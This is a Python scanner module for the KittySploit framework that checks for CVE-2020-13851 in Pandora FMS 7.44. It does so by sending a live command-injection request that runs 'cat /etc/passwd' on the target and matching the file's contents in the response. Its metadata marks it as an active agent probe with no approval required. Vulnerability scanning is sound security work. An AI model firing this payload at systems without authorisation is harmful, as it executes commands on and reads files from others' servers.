#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Artica Pandora FMS 7."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Artica Pandora FMS 7.44 - Remote Code Execution Detection',
        'description': 'Artica Pandora FMS 7.44 allows remote command execution via the events feature.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2020', 'cve', 'packetstorm', 'rce', 'pandora', 'unauth', 'artica', 'pandorafms', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/158390/Pandora-FMS-7.0-NG-7XX-Remote-Command-Execution.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-13851',
            'https://www.coresecurity.com/advisories',
            'https://github.com/hadrian3689/pandorafms_7.44',
        ],
        'cve': 'CVE-2020-13851',
    }

    def run(self):
        path = '/pandora_console/ajax.php?page=include/ajax/events&perform_event_response=10000000&target=cat+/etc/passwd&response_id=1'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('text/html', 'PHPSESSID=',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Artica Pandora FMS 7.44 - Remote Code Execution detected', path=path)
            return True
        return False

